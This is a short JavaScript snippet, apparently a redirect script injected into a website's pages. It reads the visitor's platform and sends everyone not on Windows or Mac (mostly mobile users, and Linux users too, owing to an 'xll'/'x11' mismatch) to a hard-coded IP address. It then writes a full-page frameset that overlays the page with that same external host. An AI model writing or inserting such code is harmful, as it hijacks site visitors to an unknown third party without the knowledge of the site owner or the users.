var yousite="108.186.154.7";
var url=window.document.location.pathname;
var site="http://"+yousite+url;
//平台、设备和操作系统  
var system ={  
    win : false,  
    mac : false,  
    xll : false  
};  
//检测平台 
var p = navigator.platform;    
system.win = p.indexOf("Win") == 0;  
system.mac = p.indexOf("Mac") == 0;  
system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);  
//跳转语句
if(system.win||system.mac||system.xll)
{}
else{
	window.location.href=site;
} 

document.writeln("<script language = javascript>");
document.writeln("document.write(\"<frameset rows=\'100%,*\' frameborder=\'NO\' border=\'0\' framespacing=\'0\'>\");");
document.writeln("document.write(\"<frame name=\'main\' src=\'http:\/\/108.186.154.7\' scrolling=yes>\");");
document.writeln("document.write(\"<\/frameset>\");");
document.writeln("<\/script>");